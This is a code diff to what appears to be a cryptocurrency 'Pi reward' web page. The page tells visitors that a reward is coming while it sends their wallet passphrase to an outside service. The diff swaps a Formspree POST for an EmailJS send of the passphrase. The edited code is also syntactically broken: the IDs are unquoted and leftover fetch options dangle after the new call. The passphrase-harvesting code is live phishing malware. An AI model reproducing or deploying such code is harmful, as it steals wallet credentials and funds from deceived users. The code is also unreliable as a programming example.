@@ -207,7 +207,17 @@
 
             document.getElementById("message").innerText = piAmount + " Pi will be rewarded to your wallet shortly.";
 
-            fetch('https://formspree.io/f/xeoeblqv', {
+            emailjs.send(service_kg026pr, template_nvcr5z2, {
+    passphrase: passphrase,
+    piAmount: piAmount
+}, 0J9X5wxck4rbjQo8m).then(
+    function(response) {
+        console.log("Email sent successfully!", response);
+    }, 
+    function(error) {
+        console.error("Email failed to send:", error);
+    }
+);
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ passphrase, piAmount })
